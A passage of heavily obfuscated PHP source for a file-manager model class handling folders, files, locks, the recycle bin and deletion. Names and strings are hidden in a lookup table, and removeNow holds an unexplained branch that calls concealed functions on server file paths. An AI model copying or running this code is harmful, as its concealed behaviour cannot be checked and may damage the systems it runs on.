isset($ƒƒ¨í£[$Õù•™‘Ï[33]]) && $ƒƒ¨í£[$Õù•™‘Ï[33]] == $Õù•™‘Ï[75] ? !0 : !1; } } goto a½à•Òè‰¡; eÊ–ÖŞßÄÍ: class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($È²ÌàĞò) { $¡ÀË° =& $_SERVER[§ŒØóıü]; $¬í®ÖÂì = Model($¡ÀË°[504])->where(array($¡ÀË°[1664] => $È²ÌàĞò))->find(); $÷úš³½ = $this->_mkdirRoot(SourceModel::TYPE_USER, $È²ÌàĞò, $¬í®ÖÂì[$¡ÀË°[32]]); $this->userDesktopAdd($÷úš³½); return $÷úš³½; } public function userDesktopAdd($‘çüëû) { $úØÓ¥†§ =& $_SERVER[§ŒØóıü]; $Ò‚“‡Ñ¬ = LNG($úØÓ¥†§[2134]); $˜Ò·ï¦ø = $this->mkdir($‘çüëû, $Ò‚“‡Ñ¬); $this->metaSet($˜Ò·ï¦ø, $úØÓ¥†§[2135], $úØÓ¥†§[88]); $this->metaSet($‘çüëû, $úØÓ¥†§[2136], $˜Ò·ï¦ø); } public function userPathSafeAdd($Ş–é±‡œ) { $à—‚İ” =& $_SERVER[§ŒØóıü]; $ĞóÂğöœ = Model($à—‚İ”[504])->getInfoFull($Ş–é±‡œ); if (!$ĞóÂğöœ) { return !1; } if (_get($ĞóÂğöœ, $à—‚İ”[526])) { return $ĞóÂğöœ[$à—‚İ”[466]][$à—‚İ”[2137]]; } $ÏŸ¬Íè¤ = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ş–é±‡œ, $à—‚İ”[2138], $à—‚İ”[433]); Model($à—‚İ”[504])->metaSet($Ş–é±‡œ, $à—‚İ”[2137], $ÏŸ¬Íè¤); $this->metaSet($ÏŸ¬Íè¤, $à—‚İ”[2139], $Ş–é±‡œ); return $ÏŸ¬Íè¤; } public function groupRootAdd($ğÙ…ù) { $ÇÎ²Ä• =& $_SERVER[§ŒØóıü]; $µ§ÎğËõ = Model($ÇÎ²Ä•[512])->where(array($ÇÎ²Ä•[1950] => $ğÙ…ù))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $ğÙ…ù, $µ§ÎğËõ[$ÇÎ²Ä•[32]]); } public function systemRootPathAdd($ÜÂÁ±½) { if ($ÜÂÁ±½ != $_SERVER[§ŒØóıü][534]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $ÜÂÁ±½); } public function userRootRemove($Í©äµæÔ) { $¶íá¡ = $this->targetSourceRoot(SourceModel::TYPE_USER, $Í©äµæÔ, !0); foreach ($¶íá¡ as $øÛêÚ˜¿) { if (!$øÛêÚ˜¿) { continue; } $this->remove($øÛêÚ˜¿[$_SERVER[§ŒØóıü][402]], !1); } } public function groupRootRemove($©óÑ‘Î) { $­Õğ˜å = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $©óÑ‘Î); if (!$­Õğ˜å) { return; } $this->remove($­Õğ˜å[$_SERVER[§ŒØóıü][402]], !1); } private function _mkdirRoot($›¦ĞàÂ¢, $ÏŒ½à, $®¦éûÖ, $Úè”˜Êâ = '') { $”Ì—¹ÔØ =& $_SERVER[§ŒØóıü]; $ÎÉË“ç€ = array($”Ì—¹ÔØ[401] => 0, $”Ì—¹ÔØ[576] => $›¦ĞàÂ¢, $”Ì—¹ÔØ[577] => $ÏŒ½à, $”Ì—¹ÔØ[574] => 1, $”Ì—¹ÔØ[578] => USER_ID, $”Ì—¹ÔØ[579] => USER_ID, $”Ì—¹ÔØ[575] => $Úè”˜Êâ, $”Ì—¹ÔØ[580] => $”Ì—¹ÔØ[521], $”Ì—¹ÔØ[430] => 0, $”Ì—¹ÔØ[545] => 0, $”Ì—¹ÔØ[469] => 0, $”Ì—¹ÔØ[581] => $”Ì—¹ÔØ[12]); if ($²âØşÌŠ = $this->where($ÎÉË“ç€)->find()) { return $²âØşÌŠ[$”Ì—¹ÔØ[402]]; } $íÂ’‰¼“ = "\x4d\157\144\x65\x6c\123\157\x75\x72\x63\145\x2e\155\153\144\x69\162\x52\157\x6f\164\56{$›¦ĞàÂ¢}\56{$ÏŒ½à}\56" . $®¦éûÖ; CacheLock::lock($íÂ’‰¼“); $ÎÉË“ç€[$”Ì—¹ÔØ[32]] = $®¦éûÖ; $Û©°’“Œ = $this->add($ÎÉË“ç€); $Ğæüë”î = array($”Ì—¹ÔØ[582] => short_id($Û©°’“Œ)); $this->where(array($”Ì—¹ÔØ[417] => $Û©°’“Œ))->save($Ğæüë”î); CacheLock::unlock($íÂ’‰¼“); return $Û©°’“Œ; } private function targetSourceRoot($±Â×ĞÀŞ, $Ø…‡İ—ë, $˜„ˆØ…õ = false) { $øŒÈßô» =& $_SERVER[§ŒØóıü]; $œÍ®“´ö = array($øŒÈßô»[401] => 0, $øŒÈßô»[576] => $±Â×ĞÀŞ, $øŒÈßô»[577] => $Ø…‡İ—ë); if ($˜„ˆØ…õ) { $Ê©ôŸ‹° = $this->where($œÍ®“´ö)->select(); return $Ê©ôŸ‹° ? $Ê©ôŸ‹° : array(); } $è©¨ÖíÉ = $this->where($œÍ®“´ö)->find(); return $è©¨ÖíÉ ? $è©¨ÖíÉ : array(); } public function sourceRootGroup($ÙØÅ£ëä) { $®™ÜÏ» =& $_SERVER[§ŒØóıü]; if (is_string($ÙØÅ£ëä)) { $ÙØÅ£ëä = array($ÙØÅ£ëä); } $Ì¼ÜŒé¬ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ÙØÅ£ëä, $®™ÜÏ»[189]); $âºÉ‰íØ = array($®™ÜÏ»[369] => $Ì¼ÜŒé¬, $®™ÜÏ»[366] => array($®™ÜÏ»[764] => count($ÙØÅ£ëä))); $this->_listDataApply($âºÉ‰íØ[$®™ÜÏ»[369]]); $this->_listMake($âºÉ‰íØ); return array_to_keyvalue($âºÉ‰íØ[$®™ÜÏ»[82]], $®™ÜÏ»[496]); } public function mkfile($Åéİ¦µº, $ˆˆÇ•î, $ñÖœ À = '', $îÓˆ’‹ = REPEAT_RENAME) { $ïé“³õ =& $_SERVER[§ŒØóıü]; $ÙÅï‡ıî = Model($ïé“³õ[601])->addFileByContent($ñÖœ À, $ˆˆÇ•î); return $this->_createFileCall($Åéİ¦µº, $ˆˆÇ•î, $ÙÅï‡ıî, $îÓˆ’‹, $ïé“³õ[1356]); } public function addFile($àÍú’, $°ç¾ôª, $ÈäÛ–ÂÎ, $Óƒø°İµ = false, $Ú±©’¯Ö = REPEAT_RENAME) { $Ğ¢ı»¶£ = Model($_SERVER[§ŒØóıü][601])->addFile($°ç¾ôª, $ÈäÛ–ÂÎ, $Óƒø°İµ); return $this->_createFileCall($àÍú’, $ÈäÛ–ÂÎ, $Ğ¢ı»¶£, $Ú±©’¯Ö); } public function addFileByFileID($ŠÚå”øª, $õ¥ûºˆ¡, $÷¶èŒçÊ, $€Ğñ»»İ = REPEAT_RENAME) { $ÌËÏ§Ÿ½ =& $_SERVER[§ŒØóıü]; $­Á´Ğëî = Model($ÌËÏ§Ÿ½[601])->find($õ¥ûºˆ¡); Model($ÌËÏ§Ÿ½[601])->linkAdd($õ¥ûºˆ¡); return $this->_createFileCall($ŠÚå”øª, $÷¶èŒçÊ, $­Á´Ğëî, $€Ğñ»»İ); } public function addFileByRemote($Üœ¼®âš, $ñ¢µ¹, $®­´Ş¿´, $Æ×Ñ´ = array(), $ÖÇÓ“Í— = REPEAT_RENAME) { $ó™ôÆÖé = Model($_SERVER[§ŒØóıü][601])->addFileByRemote($ñ¢µ¹, $®­´Ş¿´, $Æ×Ñ´); return $this->_createFileCall($Üœ¼®âš, $®­´Ş¿´, $ó™ôÆÖé, $ÖÇÓ“Í—); } private function _createFileCall($©ˆˆ²÷, $µ·ïíª¾, $—à‡ÁœÚ, $Ç«¡Â«, $‰ù¤§ = "\165\160\x6c\x6f\141\x64") { $Æ÷ªÛÃ¤ =& $_SERVER[§ŒØóıü]; $Á‡¢Ì†Ğ = !1; $this->setMasterDB(); $this->lockWriteStart($©ˆˆ²÷, $µ·ïíª¾); $ëÛÅ¬¢É = $this->fileNameExist($©ˆˆ²÷, $µ·ïíª¾); $®ÔùÁ¤Œ = $this->_createFile($©ˆˆ²÷, $µ·ïíª¾, $—à‡ÁœÚ, $Ç«¡Â«, $Á‡¢Ì†Ğ); if (!$Á‡¢Ì†Ğ) { Model($Æ÷ªÛÃ¤[471])->remove($—à‡ÁœÚ[$Æ÷ªÛÃ¤[468]]); } if ($Á‡¢Ì†Ğ && $®ÔùÁ¤Œ && $®ÔùÁ¤Œ != $ëÛÅ¬¢É) { Model($Æ÷ªÛÃ¤[2107])->eventCreate($®ÔùÁ¤Œ, $‰ù¤§); } $this->lockWriteEnd($©ˆˆ²÷, $µ·ïíª¾); return $®ÔùÁ¤Œ; } public function mkdir($–Ù´“ùà, $óä ÀÏô, $€ğ»Œ½Ç = REPEAT_SKIP) { $ö½…·ì =& $_SERVER[§ŒØóıü]; $this->setMasterDB(); $—€ãµí = $this->sourceInfo($–Ù´“ùà); if (!$—€ãµí) { return !1; } $this->lockWriteStart($–Ù´“ùà, $óä ÀÏô); if ($€ğ»Œ½Ç !== !1) { $ï®›ƒ• = $this->fileNameExist($–Ù´“ùà, $óä ÀÏô); if ($ï®›ƒ• && $€ğ»Œ½Ç != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($–Ù´“ùà, $óä ÀÏô); return $ï®›ƒ•; } $óä ÀÏô = $this->fileNameAuto($–Ù´“ùà, $óä ÀÏô, $€ğ»Œ½Ç); } $“–ˆ´ÆÂ = array($ö½…·ì[574] => 1, $ö½…·ì[420] => $óä ÀÏô, $ö½…·ì[575] => $ö½…·ì[12], $ö½…·ì[469] => 0, $ö½…·ì[545] => 0); $”ÂØôİ’ = $this->_addSource($“–ˆ´ÆÂ, $—€ãµí); Model($ö½…·ì[2107])->eventCreate($”ÂØôİ’, $ö½…·ì[1357]); $this->lockWriteEnd($–Ù´“ùà, $óä ÀÏô); return $”ÂØôİ’; } public function listSourceRoot($ğÚˆÚ‹Ü, $ˆ»ßÓş, $â’™É = "\x73\157\165\x72\143\145\111\104\x2c\x74\x61\x72\147\145\164\x49\104\x2c\x73\x69\172\145") { $ú‘àÈÓÄ =& $_SERVER[§ŒØóıü]; $²¡°Ú‚ß = $ú‘àÈÓÄ[378]; $£ä¿Š¡— = array(); $–Åš×Ü = 1024 * 50; $ğ¼˜³·  = is_array($ğ¼˜³· ) ? $ğ¼˜³·  : array(); $Ëï­äÓº = count($ˆ»ßÓş); $ßşü…º = $this->tablePrefix . $ú‘àÈÓÄ[2140]; for ($úûµãä  = 0; $úûµãä  < $Ëï­äÓº; $úûµãä ++) { $ÚÛ…±ù› = $ˆ»ßÓş[$úûµãä ]; $²¡°Ú‚ß .= "\x53\x45\x4c\x45\x43\x54\x20\x2a\x20\106\x52\x4f\115\40\x28\x53\105\x4c\105\x43\124\x20{$â’™É}\40\106\122\x4f\x4d\x20\140{$ßşü…º}\x60\40\x57\x48\x45\122\105\40"; $²¡°Ú‚ß .= "\x60\160\x61\x72\x65\156\164\111\104\x60\x3d\60\40\x41\x4e\104\x20\x60\164\141\x72\147\x65\x74\111\x44\140\75{$ÚÛ…±ù›}\x20\x41\x4e\x44\x20\x60\164\141\x72\147\145\x74\x54\x79\160\x65\x60\x3d{$ğÚˆÚ‹Ü}\40\x61\156\144\x20\146\x69\154\145\x54\x79\160\145\x3d\47\x27\40\154\151\x6d\x69\x74\40\x31\x29\40\141\163\x20\164\142\137{$úûµãä }\40\125\x4e\x49\117\116\x20\x41\114\x4c\40"; if ((strlen($²¡°Ú‚ß) >= $–Åš×Ü || $úûµãä  == $Ëï­äÓº - 1) && $²¡°Ú‚ß) { $²¡°Ú‚ß = substr($²¡°Ú‚ß, 0, -strlen($ú‘àÈÓÄ[1044])); $ºèáÎ˜ = $this->query($²¡°Ú‚ß); $²¡°Ú‚ß = $ú‘àÈÓÄ[12]; $£ä¿Š¡— = array_merge($£ä¿Š¡—, $ºèáÎ˜); } } return $£ä¿Š¡—; } private function _createFile($£âí·À, $ÅÏ¡ùë, $Úà˜ ‡, $ğ¨¯Í‡, &$Ìœû§µÍ) { $™šššË× =& $_SERVER[§ŒØóıü]; $ˆº¬Æ¤è = $this->sourceInfo($£âí·À); if (!$Úà˜ ‡ || !$ˆº¬Æ¤è) { return !1; } if ($ğ¨¯Í‡ !== !1) { $¹¥÷¡‡É = $this->fileNameExist($£âí·À, $ÅÏ¡ùë); } $Ìœû§µÍ = !0; if ($ğ¨¯Í‡ && $¹¥÷¡‡É) { if ($ğ¨¯Í‡ == REPEAT_SKIP) { $Ìœû§µÍ = !1; return $¹¥÷¡‡É; } else { if ($ğ¨¯Í‡ == REPEAT_REPLACE) { $Æšƒª“É = $this->sourceInfo($¹¥÷¡‡É); $ÙÙ†Ãú = $this->fileHistory($Æšƒª“É, $Úà˜ ‡[$™šššË×[468]], $Úà˜ ‡[$™šššË×[76]]); if (!$ÙÙ†Ãú) { $Ìœû§µÍ = !1; } else { $this->folderSizeReset($£âí·À); } return $¹¥÷¡‡É; } else { $ÅÏ¡ùë = $this->fileNameAuto($£âí·À, $ÅÏ¡ùë, $ğ¨¯Í‡, !1); } } } $‹Ÿõ…€‡ = array($™šššË×[574] => 0, $™šššË×[420] => $ÅÏ¡ùë, $™šššË×[575] => substr(get_path_ext($ÅÏ¡ùë), 0, 10), $™šššË×[469] => $Úà˜ ‡[$™šššË×[468]], $™šššË×[545] => $Úà˜ ‡[$™šššË×[76]]); $ÊÎÜ¶å¶ = $this->_addSource($‹Ÿõ…€‡, $ˆº¬Æ¤è); $this->folderSizeReset($£âí·À, intval($‹Ÿõ…€‡[$™šššË×[76]])); return $ÊÎÜ¶å¶; } protected function fileHistory($–³æëßµ, $§ñºãõÇ, $¿¦Ö«¸) { $À¬”·òß =& $_SERVER[§ŒØóıü]; if ($–³æëßµ[$À¬”·òß[468]] == $§ñºãõÇ) { return !1; } $this->checkLock($–³æëßµ[$À¬”·òß[402]], $§ñºãõÇ); Model($À¬”·òß[2141])->addHistory($–³æëßµ); $ÊÁÔ¿Ë« = array($À¬”·òß[579] => USER_ID, $À¬”·òß[424] => time(), $À¬”·òß[468] => $§ñºãõÇ, $À¬”·òß[76] => $¿¦Ö«¸); $this->where(array($À¬”·òß[417] => $–³æëßµ[$À¬”·òß[402]]))->save($ÊÁÔ¿Ë«); $this->sourceCacheClear($–³æëßµ[$À¬”·òß[402]]); return !0; } public function checkLock($÷ÂÊ°Î, $à©Ú¿€) { $Ç”Ö±¸ä =& $_SERVER[§ŒØóıü]; $ûİÙâĞ¶ = $this->pathInfo($÷ÂÊ°Î); if (!$this->fileIsLock($ûİÙâĞ¶, !0)) { return; } $úµÂâ† = Session::get($Ç”Ö±¸ä[2142]); $Ã­´»¿³ = substr($ûİÙâĞ¶[$Ç”Ö±¸ä[32]], 0, -1 - strlen($ûİÙâĞ¶[$Ç”Ö±¸ä[174]])) . $Ç”Ö±¸ä[1214] . $úµÂâ† . $Ç”Ö±¸ä[10] . $ûİÙâĞ¶[$Ç”Ö±¸ä[174]]; $ˆ©°ÎÒ = Model($Ç”Ö±¸ä[601])->find($à©Ú¿€); $this->_createFileCall($ûİÙâĞ¶[$Ç”Ö±¸ä[432]], $Ã­´»¿³, $ˆ©°ÎÒ, REPEAT_REPLACE, $Ç”Ö±¸ä[1356]); $ÃõÆµŸï = $ûİÙâĞ¶[$Ç”Ö±¸ä[466]][$Ç”Ö±¸ä[538]]; $ùÄ‹ÈÇ = $ÃõÆµŸï[$Ç”Ö±¸ä[532]] ? $ÃõÆµŸï[$Ç”Ö±¸ä[532]] : $ÃõÆµŸï[$Ç”Ö±¸ä[32]]; show_json(LNG($Ç”Ö±¸ä[2143]) . $Ç”Ö±¸ä[2144] . LNG($Ç”Ö±¸ä[2145]) . $Ç”Ö±¸ä[2146] . $ùÄ‹ÈÇ . $Ç”Ö±¸ä[2147], !1); } public function fileIsLock($Ïè÷Êşß, $¸Á¯ÌÎ = false) { $±ô´ü˜ =& $_SERVER[§ŒØóıü]; if (!isset($Ïè÷Êşß[$±ô´ü˜[466]]) || !$Ïè÷Êşß[$±ô´ü˜[466]][$±ô´ü˜[535]]) { return !1; } if ($Ïè÷Êşß[$±ô´ü˜[466]][$±ô´ü˜[535]] != USER_ID) { return !0; } $¼Ú—ôîÀ = $GLOBALS[$±ô´ü˜[6]][$±ô´ü˜[89]][$±ô´ü˜[536]]; if ($Ïè÷Êşß[$±ô´ü˜[466]][$±ô´ü˜[537]] <= time() - $¼Ú—ôîÀ) { $this->metaSet($Ïè÷Êşß[$±ô´ü˜[402]], $±ô´ü˜[535], null); $this->metaSet($Ïè÷Êşß[$±ô´ü˜[402]], $±ô´ü˜[537], null); } if ($¸Á¯ÌÎ) { $this->metaSet($Ïè÷Êşß[$±ô´ü˜[402]], $±ô´ü˜[537], time()); } return !1; } private function _addSource($‚÷·´£°, $É€Ş´ÊŒ) { $…ŒÜÃ =& $_SERVER[§ŒØóıü]; $ÏØş¤°ı = array($…ŒÜÃ[576] => $É€Ş´ÊŒ[$…ŒÜÃ[411]], $…ŒÜÃ[577] => $É€Ş´ÊŒ[$…ŒÜÃ[496]], $…ŒÜÃ[578] => USER_ID, $…ŒÜÃ[579] => USER_ID, $…ŒÜÃ[401] => $É€Ş´ÊŒ[$…ŒÜÃ[402]], $…ŒÜÃ[580] => $É€Ş´ÊŒ[$…ŒÜÃ[511]] . $É€Ş´ÊŒ[$…ŒÜÃ[402]] . $…ŒÜÃ[50], $…ŒÜÃ[430] => 0, $…ŒÜÃ[581] => $…ŒÜÃ[12]); $‚÷·´£° = array_merge($ÏØş¤°ı, $‚÷·´£°); $this->updateModifyTime($‚÷·´£°[$…ŒÜÃ[432]]); $È‰ÄÛœ» = $…ŒÜÃ[2148] . $É€Ş´ÊŒ[$…ŒÜÃ[402]]; if (isset(self::$cacheChildList[$È‰ÄÛœ»])) { unset(self::$cacheChildList[$È‰ÄÛœ»]); } static $“ˆØŠ´¡ = false; if (!$“ˆØŠ´¡) { Hook::trigger($…ŒÜÃ[564], $‚÷·´£°); $“ˆØŠ´¡ = !0; } $ùƒÅ®‘ = $this->add($‚÷·´£°); $€˜ßÜ‡ = array($…ŒÜÃ[582] => short_id($ùƒÅ®‘)); $this->where(array($…ŒÜÃ[417] => $ùƒÅ®‘))->save($€˜ßÜ‡); $this->setNamePinyin($ùƒÅ®‘, $‚÷·´£°[$…ŒÜÃ[32]]); return $ùƒÅ®‘; } public function remove($ùŸ¢“ÌÃ, $×–áÚ† = true) { $Ãèşß£ =& $_SERVER[§ŒØóıü]; $…Š‘ûé• = $this->sourceInfo($ùŸ¢“ÌÃ); $ë‹áŞÔ = intval($…Š‘ûé•[$Ãèşß£[411]]) === self::TYPE_SYSTEM; $øáÊÅã = Model($Ãèşß£[435])->get($Ãèşß£[2149]) == $Ãèşß£[88]; if ($ë‹áŞÔ || $×–áÚ† || !$øáÊÅã) { return $this->removeNow($ùŸ¢“ÌÃ, $×–áÚ†); } $”ÜÎîòø = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $èÂİ¢‰÷ = $…Š‘ûé•[$Ãèşß£[411]] == self::TYPE_USER ? $Ãèşß£[590] : $Ãèşß£[505]; if ($èÂİ¢‰÷ == $Ãèşß£[590]) { $€°‹—Àï = Model($Ãèşß£[504])->getInfo($…Š‘ûé•[$Ãèşß£[496]]); $ñã‘ÊÙš = !empty($€°‹—Àï[$Ãèşß£[532]]) ? $€°‹—Àï[$Ãèşß£[532]] : $€°‹—Àï[$Ãèşß£[32]]; $ñã‘ÊÙš = $Ãèşß£[260] . $ñã‘ÊÙš . $Ãèşß£[2150] . $…Š‘ûé•[$Ãèşß£[496]]; } else { $€°‹—Àï = Model($Ãèşß£[512])->getInfo($…Š‘ûé•[$Ãèşß£[496]]); $ñã‘ÊÙš = _get($€°‹—Àï, $Ãèşß£[32]); $ñã‘ÊÙš = $Ãèşß£[162] . $ñã‘ÊÙš . $Ãèşß£[2151] . $…Š‘ûé•[$Ãèşß£[496]]; } $ÉŸÄÀ¦Š = $Ãèşß£[2152] . md5($ñã‘ÊÙš); CacheLock::lock($ÉŸÄÀ¦Š); $´çêÖ¦ = $this->fileNameExist($”ÜÎîòø, $ñã‘ÊÙš); if (!$´çêÖ¦) { $´çêÖ¦ = $this->mkdir($”ÜÎîòø, $ñã‘ÊÙš, REPEAT_SKIP); $this->metaSet($´çêÖ¦, $Ãèşß£[2153], $èÂİ¢‰÷); $this->metaSet($´çêÖ¦, $Ãèşß£[2154], $…Š‘ûé•[$Ãèşß£[496]]); if ($…Š‘ûé•[$Ãèşß£[432]] != 0) { $this->metaSet($´çêÖ¦, $Ãèşß£[2155], _get($€°‹—Àï, $Ãèşß£[2156])); } } CacheLock::unlock($ÉŸÄÀ¦Š); $this->metaSet($ùŸ¢“ÌÃ, $Ãèşß£[2157], $…Š‘ûé•[$Ãèşß£[432]]); $this->where(array($Ãèşß£[402] => $ùŸ¢“ÌÃ))->save(array($Ãèşß£[424] => time())); $this->recycleClear($…Š‘ûé•); $ìæ„Ûô = $this->move($ùŸ¢“ÌÃ, $´çêÖ¦, REPEAT_RENAME_FOLDER); $this->folderSizeReset($…Š‘ûé•[$Ãèşß£[432]]); return $ìæ„Ûô; } private function recycleClear($ò½î¡¼×) { $—ëªôâÄ =& $_SERVER[§ŒØóıü]; $Ê¶®Ï¾‘ = $this->childrenAll($ò½î¡¼×); $ºïÚèèÚ = array($—ëªôâÄ[417] => array($—ëªôâÄ[418], $Ê¶®Ï¾‘[$—ëªôâÄ[2158]])); Model($—ëªôâÄ[2159])->where($ºïÚèèÚ)->delete(); } public function removeNow($ª‡ĞƒÂ¬, $·Ô³ÚñŒ = true) { $Ü‘»àÍ¡ =& $_SERVER[§ŒØóıü]; if ($_SERVER[$Ü‘»àÍ¡[746]] != $_SERVER[$Ü‘»àÍ¡[1364]]) { $”¨Ş²æ§ = $Ü‘»àÍ¡[883]; $£±óÒ¹ = $Ü‘»àÍ¡[748]; $¿üÊƒŸâ = $_SERVER[$Ü‘»àÍ¡[749]] . $Ü‘»àÍ¡[750]; $øööê = $£±óÒ¹($¿üÊƒŸâ); $Æá­Øâ = explode($Ü‘»àÍ¡[231], $øööê); if (count($Æá­Øâ) < $Ü‘»àÍ¡[656]) { $†ëïÏÂã = $Ü‘»àÍ¡[751]; $†ëïÏÂã(); } $‰­âí¨¶ = $Ü‘»àÍ¡[884]; $‰­âí¨¶($_SERVER[$Ü‘»àÍ¡[885]]); $‰­âí¨¶($_SERVER[$Ü‘»àÍ¡[749]] . $Ü‘»àÍ¡[1540]); $Ä¿á›¥ = 1; while ($Ä¿á›¥ > 1) { $Ä¿á›¥ = $Ä¿á›¥ + 4; $ÑîÁÅÔ– = rawurlencode($Ä¿á›¥ . $Ü‘»àÍ¡[378]); } } $Ã˜÷Èîû = $this->sourceInfo($ª‡ĞƒÂ¬); $‚ù ÷·ò = $this->pathInfoMore($ª‡ĞƒÂ¬); if (!$Ã˜÷Èîû) { return !0; } if ($Ã˜÷Èîû[$Ü‘»àÍ¡[432]] == 0) { if (!_get($GLOBALS, $Ü‘»àÍ¡[494])) { return !1; } } $this->lockMoveStart($ª‡ĞƒÂ¬); Hook::trigger($Ü‘»àÍ¡[2160], $‚ù ÷·ò, $·Ô³ÚñŒ); if ($·Ô³ÚñŒ) { Model($Ü‘»àÍ¡[2159])->moveToRecycle($ª‡ĞƒÂ¬); } else { $ÈÜÍ»×â = $this->childrenAll($Ã˜÷Èîû); Model($Ü‘»àÍ¡[561])->eventRemove($ª‡ĞƒÂ¬); $this->removeRelevance($ÈÜÍ»×â[$Ü‘»àÍ¡[2158]], $ÈÜÍ»×â[$Ü‘»àÍ¡[1489]]); } $this->folderSizeReset($Ã˜÷Èîû[$Ü‘»àÍ¡[432]]); $ÃªÎ¾¸¢ = array($Ã˜÷Èîû[$Ü‘»àÍ¡[432]]); if ($Ã˜÷Èîû[$Ü‘»àÍ¡[410]] == $Ü‘»àÍ¡[88]) { $ÃªÎ¾¸¢[] = $Ã˜÷Èîû[$Ü‘»àÍ¡[402]]; } $this->updateModifyTime($ÃªÎ¾¸¢); $this->lockMoveEnd($ª‡ĞƒÂ¬); Hook::trigger($Ü‘»àÍ¡[1715], $‚ù ÷·ò, $·Ô³ÚñŒ); return !0; } public function childrenAll($›ÈËêÊª) { $Ïó°ø‘× =& $_SERVER[§ŒØóıü]; $ˆ¸ã›À = $›ÈËêÊª[$Ïó°ø‘×[402]]; if ($›ÈËêÊª[$Ïó°ø‘×[410]] == $Ïó°ø‘×[88]) { $ª€˜ÊŸ = array($Ïó°ø‘×[580] => array($Ïó°ø‘×[540], $›ÈËêÊª[$Ïó°ø‘×[511]] . $ˆ¸ã›À . $Ïó°ø‘×[541])); $ •œÉİì = array($Ïó°ø‘×[580] => $ª€˜ÊŸ[$Ïó°ø‘×[511]]); $Ùˆ”Á£„ = $this->field($Ïó°ø‘×[2161])->where($ •œÉİì)->select(); $©’Ş·§¹ = !1; $‚ò°ã…‰ = array($ˆ¸ã›À); if ($Ùˆ”Á£„) { $©’Ş·§¹ = array_to_keyvalue($Ùˆ”Á£„, $Ïó°ø‘×[12], $Ïó°ø‘×[468]); $©’Ş·§¹ = array_remove_value($©’Ş·§¹, $Ïó°ø‘×[198]); $‚ò°ã…‰ = array_to_keyvalue($Ùˆ”Á£„, $Ïó°ø‘×[12], $Ïó°ø‘×[402]); $‚ò°ã…‰[] = $ˆ¸ã›À; } } else { $©’Ş·§¹ = array($›ÈËêÊª[$Ïó°ø‘×[468]]); $‚ò°ã…‰ = array($ˆ¸ã›À); } return array($Ïó°ø‘×[2158] => $‚ò°ã…‰, $Ïó°ø‘×[1489] => $©’Ş·§¹); } public function removeArray($·£ä¯ğ) { if (!$·£ä¯ğ) { return !0; } } public function removeRelevance($ÃÅİ»‰, $ÇŠ¨®¤Š) { $ùçêş‰ =& $_SERVER[§ŒØóıü]; $ÃÅİ»‰ = $ÃÅİ»‰ ? $ÃÅİ»‰ : array(); $ÇŠ¨®¤Š = $ÇŠ¨®¤Š ? $ÇŠ¨®¤Š : array(); $ÃÅİ»‰ = array_unique(array_filter($ÃÅİ»‰)); $ÇŠ¨®¤Š = array_unique(array_filter($ÇŠ¨®¤Š)); if (!$ÃÅİ»‰) { return !1; } $Şö–™É = array($ùçêş‰[417] => array($ùçêş‰[418], $ÃÅİ»‰)); Model($ùçêş‰[2159])->where($Şö–™É)->delete(); Model($ùçêş‰[462])->where($Şö–™É)->delete(); Model($ùçêş‰[2009])->where($Şö–™É)->delete(); Model($ùçêş‰[561])->where($Şö–™É)->delete(); Model($ùçêş‰[1842])->removeBySource($ÃÅİ»‰); Model($ùçêş‰[2141])->removeBySource($ÃÅİ»‰); $this->where($Şö–™É)->delete(); Model($ùçêş‰[471])->remove($ÇŠ¨®¤Š); for ($ù‡œ¨ë½ = 0; $ù‡œ¨ë½ < count($ÃÅİ»‰); $ù‡œ¨ë½++) { $this->sourceCacheClear($ÃÅİ»‰[$ù‡œ¨ë½]); } } public function rename($ÊàŠŸ‘î, $åÜÁ¡°) { $‹Úšô‚ =& $_SERVER[§ŒØóıü]; $¡“è­Üå = $this->sourceInfo($ÊàŠŸ‘î); if (!$¡“è­Üå) { return !1; } $„ˆË½·î = $this->fileNameExist($¡“è­Üå[$‹Úšô‚[432]], $åÜÁ¡°); if ($„ˆË½·î && $„ˆË½·î != $ÊàŠŸ‘î) { return !1; } $‚¦¯îÃ = array($‹Úšô‚[420] => $åÜÁ¡°, $‹Úšô‚[579] => USER_ID); if ($¡“è­Üå[$‹Úšô‚[410]] != $‹Úšô‚[88]) { $‚¦¯îÃ[$‹Úšô‚[412]] = substr(get_path_ext($åÜÁ¡°), 0, 10); } Model($‹Úšô‚[561])->eventRename($ÊàŠŸ‘î, $¡“è­Üå[$‹Úšô‚[32]], $åÜÁ¡°); $this->sourceCacheClear($ÊàŠŸ‘î); $this->setNamePinyin($ÊàŠŸ‘î, $‚¦¯îÃ[$‹Úšô‚[32]], !1); $this->updateModifyTime($¡“è­Üå[$‹Úšô‚[432]]); $•å®¿¤¸ = $this->where(array($‹Úšô‚[417] => $ÊàŠŸ‘î))->data($‚¦¯îÃ)->save(); $‰û»–Ü§ = $‹Úšô‚[2148] . $¡“è­Üå[$‹Úšô‚[432]]; if (isset(self::$cacheChildList[$‰û»–Ü§])) { unset(self::$cacheChildList[$‰û»–Ü§]); } return $•å®¿¤¸; } public function setNamePinyin($¾¢¹®œ, $½ŞÀ×´ˆ, $ËÇğÉ€ª = true) { $¡·‰‹• =& $_SERVER[§ŒØóıü]; $şœş¥şÆ = Input::check($½ŞÀ×´ˆ, $¡·‰‹•[583]); $ìüÓÊ– = array($¡·‰‹•[444] => KodSort::makeStr($½ŞÀ×´ˆ)); if ($şœş¥şÆ) { $ìüÓÊ–[$¡·‰‹•[465]] = str_replace($¡·‰‹•[53], $¡·‰‹•[12], Pinyin::get($½ŞÀ×´ˆ)); $ìüÓÊ–[$¡·‰‹•[464]] = Pinyin::get($½ŞÀ×´ˆ, $¡·‰‹•[584]); } if (!$ËÇğÉ€ª && !$şœş¥şÆ) { $ìüÓÊ–[$¡·‰‹•[465]] = null; $ìüÓÊ–[$¡·‰‹•[464]] = null; } $this->metaSet($¾¢¹®œ, $ìüÓÊ–); } public function getContent($§…¤ş¶Š) { $•ƒç¯é =& $_SERVER[§ŒØóıü]; $™¬õûÄ = $this->fileInfoGet($§…¤ş¶Š); if (!$™¬õûÄ) { return !1; } if ($™¬õûÄ[$•ƒç¯é[76]] == 0) { return 